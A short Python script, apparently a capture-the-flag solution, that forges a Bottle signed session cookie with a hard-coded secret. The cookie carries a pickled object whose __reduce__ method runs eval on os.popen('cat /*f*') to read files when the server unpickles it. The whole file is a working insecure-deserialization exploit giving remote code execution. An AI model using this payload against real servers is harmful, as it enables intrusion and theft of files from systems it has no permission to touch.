from bottle import route, run, get, request, response, template, default_app
import os
secret = "cCySMEDJ9LOlStFzu-k9HE0XUZIkGlGqMkDOBHOldXI"


class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").popen("cat /*f*").read()',))

app = default_app()

# create forged signed cookies payloads
@get('/payload')
def cookie():

    session = {"payloads": [Exploit()]}
    response.set_cookie('session', session, secret=secret)
    return template('index', payloads=session['payloads'])

run(host='localhost', port=8081, reload=True)